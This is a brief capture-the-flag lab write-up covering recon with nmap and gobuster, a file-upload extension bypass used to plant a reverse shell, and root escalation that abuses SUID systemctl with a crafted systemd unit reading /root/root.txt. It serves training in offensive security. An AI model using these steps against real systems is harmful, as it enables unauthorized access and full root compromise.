# Nmap 
`nmap -sV 10.48.149.174`

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
-v is the flag for enabling verbose mode using Nmap

> It's essential to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open, so constantly scan ports after 1000 (even if you leave checking in the background).

# Directory Enum
`gobuster dir -u http://10.48.149.174:3333/ -w /usr/share/wordlists/directory-list-1.0.txt`

> What is the directory that has an upload form page? `/internal`

# Initial Access with File Upload Bypass 
Intruder used by fuzzing file extensions. 
A wordlist with the following extensions made: ".php, .php3, .php4, .php5, .phtml"
Reverse shell uploaded using `.phtml`

# PrivEsc
> In Linux, SUID (set owner userId upon execution) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
	Find SUID files with `find / -perm -u=s -type f 2>/dev/null`

```
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $eop 

/bin/systemctl link $eop 
/bin/systemctl enable --now $eop 
```
